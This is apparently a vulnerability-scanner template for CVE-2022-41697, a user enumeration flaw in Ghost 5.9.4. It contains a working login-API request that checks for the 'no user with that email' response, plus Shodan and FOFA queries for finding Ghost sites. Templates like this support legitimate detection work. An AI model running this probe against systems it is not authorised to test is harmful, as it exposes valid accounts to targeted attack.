id: CVE-2022-41697

info:
  name: Ghost Foundation Ghost User Enumeration Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A user enumeration vulnerability exists in the login functionality of Ghost Foundation Ghost 5.9.4. A specially-crafted HTTP request can lead to a disclosure of sensitive information.
  impact: |
    An attacker can enumerate valid user accounts, facilitating targeted attacks.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://talosintelligence.com/vulnerability_reports/TALOS-2022-1625
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2022-41697
    cwe-id: CWE-204
    epss-score: 0.00323
    epss-percentile: 0.71444
    cpe: cpe:2.3:a:ghost:ghost:5.9.4:*:*:*:*:node.js:*:*
  metadata:
    vendor: ghost
    product: ghost
    framework: node.js
    shodan-query: http.component:"Ghost"
    fofa-query: app="ghost"

http:
  - method: POST
    path:
      - "{{BaseURL}}/ghost/api/admin/session"

    headers:
      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0"
      Accept: "text/plain, */*; q=0.01"
      Accept-Language: "en-US,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "application/json;charset=utf-8"
      X-Ghost-Version: "5.12"
      App-Pragma: "no-cache"
      X-Requested-With: "XMLHttpRequest"
      Origin: "{{BaseURL}}"
      DNT: "1"
      Connection: "close"
      Referer: "{{BaseURL}}/ghost/"
      Sec-Fetch-Dest: "empty"
      Sec-Fetch-Mode: "cors"
      Sec-Fetch-Site: "same-origin"

    body: |
      {
        "username":"lkjasdfklasjdf@asdf.com",
        "password":"asdfasdfasdf"
      }
    matchers:
      - type: word
        words:
          - "There is no user with that email address."
        part: body
